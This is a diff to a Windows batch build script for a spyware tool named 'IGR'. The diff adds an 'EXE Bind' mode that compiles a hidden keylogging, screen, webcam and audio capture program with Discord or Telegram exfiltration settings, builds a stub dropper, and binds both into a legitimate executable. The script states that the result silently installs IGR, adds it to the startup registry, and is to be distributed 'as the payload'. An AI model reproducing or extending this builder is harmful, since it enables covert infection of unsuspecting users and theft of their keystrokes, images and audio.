@@ -5,7 +5,19 @@ set "IGR_VERSION="
 for /f %%v in ('python -c "import re;m=re.search(r'IGR_VERSION\s*=\s*[\x22\x27]([^\x22\x27]+)',open('main.py').read());print(m.group(1) if m else '6')"') do set "IGR_VERSION=%%v"
 if not defined IGR_VERSION set "IGR_VERSION=6"
 echo ============================================
-echo   IGR v%IGR_VERSION% Build - Compiling executable
+echo   IGR v%IGR_VERSION% Build
+echo ============================================
+echo.
+echo   Injection Method:
+echo   [1] USB Stick   - Manual deploy via USB (classic)
+echo   [2] EXE Bind    - Merge IGR into a legitimate .exe
+echo.
+set /p "INJECT_MODE=Choose method (1 or 2): "
+if "%INJECT_MODE%"=="2" goto :bind_mode
+
+echo.
+echo ============================================
+echo   IGR v%IGR_VERSION% Build - USB Stick Mode
 echo ============================================
 echo.
 
@@ -213,3 +225,161 @@ echo     subfiles\:  igr_v%IGR_VERSION%.exe -^> igr.exe, cloudflared.exe
 echo ============================================
 echo.
 pause
+exit /b 0
+
+REM ============================================================================
+REM EXE BIND MODE - Merge IGR into a legitimate executable
+REM ============================================================================
+:bind_mode
+
+echo.
+echo ============================================
+echo   IGR v%IGR_VERSION% Build - EXE Bind Mode
+echo ============================================
+echo.
+
+REM Check for config.txt
+if not exist "config.txt" (
+    echo ERROR: config.txt not found!
+    echo   Copy config.example.txt to config.txt and fill in your values.
+    pause
+    exit /b 1
+)
+
+REM Read config.txt values
+echo [1/7] Reading config.txt...
+set "DISCORD_WEBHOOK="
+set "DISCORD_USERNAME=IGR"
+set "DASHBOARD_PASSWORD="
+set "TELEGRAM_BOT_TOKEN="
+set "TELEGRAM_CHAT_ID="
+set "UPDATE_URL="
+
+for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do (
+    set "line=%%a"
+    if not "!line:~0,1!"=="#" (
+        if "%%a"=="DISCORD_WEBHOOK" set "DISCORD_WEBHOOK=%%b"
+        if "%%a"=="DISCORD_USERNAME" set "DISCORD_USERNAME=%%b"
+        if "%%a"=="DASHBOARD_PASSWORD" set "DASHBOARD_PASSWORD=%%b"
+        if "%%a"=="TELEGRAM_BOT_TOKEN" set "TELEGRAM_BOT_TOKEN=%%b"
+        if "%%a"=="TELEGRAM_CHAT_ID" set "TELEGRAM_CHAT_ID=%%b"
+        if "%%a"=="UPDATE_URL" set "UPDATE_URL=%%b"
+    )
+)
+
+set "HAS_DISCORD=0"
+set "HAS_TELEGRAM=0"
+if defined DISCORD_WEBHOOK set "HAS_DISCORD=1"
+if defined TELEGRAM_BOT_TOKEN if defined TELEGRAM_CHAT_ID set "HAS_TELEGRAM=1"
+
+if "%HAS_DISCORD%"=="0" if "%HAS_TELEGRAM%"=="0" (
+    echo ERROR: At least Discord or Telegram must be configured in config.txt!
+    pause
+    exit /b 1
+)
+
+echo   Config loaded.
+
+REM Inject config into main.py
+echo.
+echo [2/7] Injecting configuration...
+copy /y "main.py" "main_build.py" >nul
+
+powershell -Command "(Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', '%DISCORD_WEBHOOK%' -replace 'BUILD_DISCORD_USERNAME', '%DISCORD_USERNAME%' -replace 'BUILD_DASHBOARD_PASSWORD', '%DASHBOARD_PASSWORD%' -replace 'BUILD_TELEGRAM_BOT_TOKEN', '%TELEGRAM_BOT_TOKEN%' -replace 'BUILD_TELEGRAM_CHAT_ID', '%TELEGRAM_CHAT_ID%' -replace 'BUILD_UPDATE_URL', '%UPDATE_URL%' | Set-Content 'main_build.py' -NoNewline"
+
+echo   Values injected.
+
+REM Install dependencies
+echo.
+echo [3/7] Installing dependencies...
+pip install pyinstaller flask requests opencv-python pynput pillow pyaudio cryptography 2>nul
+echo   Done.
+
+REM Compile IGR exe
+echo.
+echo [4/7] Compiling igr_v%IGR_VERSION%.exe...
+python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --clean --noconfirm ^
+    --hidden-import flask ^
+    --hidden-import requests ^
+    --hidden-import pynput.keyboard ^
+    --hidden-import pynput.mouse ^
+    --hidden-import cv2 ^
+    --hidden-import PIL.Image ^
+    --hidden-import PIL.ImageTk ^
+    --hidden-import PIL.ImageGrab ^
+    --hidden-import pyaudio ^
+    --hidden-import cryptography ^
+    --hidden-import cryptography.hazmat.primitives.ciphers.aead ^
+    --hidden-import sqlite3 ^
+    main_build.py
+
+del /f /q "main_build.py" >nul 2>&1
+
+if not exist "dist\igr_v%IGR_VERSION%.exe" (
+    echo.
+    echo ERROR: IGR build failed - igr_v%IGR_VERSION%.exe not found in dist\
+    pause
+    exit /b 1
+)
+echo   IGR exe compiled.
+
+REM Compile stub dropper
+echo.
+echo [5/7] Compiling stub.exe (dropper)...
+python -m PyInstaller --onefile --noconsole --name stub --clean --noconfirm ^
+    stub.py
+
+if not exist "dist\stub.exe" (
+    echo.
+    echo ERROR: Stub build failed - stub.exe not found in dist\
+    pause
+    exit /b 1
+)
+echo   Stub compiled.
+
+REM Ask for target exe
+echo.
+echo [6/7] Select target executable...
+echo   Drag and drop the legitimate .exe file into this terminal:
+set /p "TARGET_EXE="
+REM Remove surrounding quotes if present
+set "TARGET_EXE=%TARGET_EXE:"=%"
+
+if not exist "%TARGET_EXE%" (
+    echo ERROR: File not found: %TARGET_EXE%
+    pause
+    exit /b 1
+)
+
+for %%f in ("%TARGET_EXE%") do set "TARGET_NAME=%%~nxf"
+echo   Target: %TARGET_NAME% (%TARGET_EXE%)
+
+REM Bind everything together
+echo.
+echo [7/7] Binding executables...
+python binder.py "dist\stub.exe" "%TARGET_EXE%" "dist\igr_v%IGR_VERSION%.exe" "dist\%TARGET_NAME%"
+
+if not exist "dist\%TARGET_NAME%" (
+    echo.
+    echo ERROR: Binding failed - output not found
+    pause
+    exit /b 1
+)
+
+echo.
+echo ============================================
+echo   EXE BIND BUILD SUCCESSFUL
+echo ============================================
+echo   Output: dist\%TARGET_NAME%
+echo   Size:  ~?? bytes
+echo.
+echo   When opened, this exe will:
+echo     1. Launch the legitimate program normally
+echo     2. Silently install IGR in the background
+echo     3. Add IGR to startup registry
+echo.
+echo   Distribute dist\%TARGET_NAME% as the payload.
+echo ============================================
+echo.
+pause
+exit /b 0
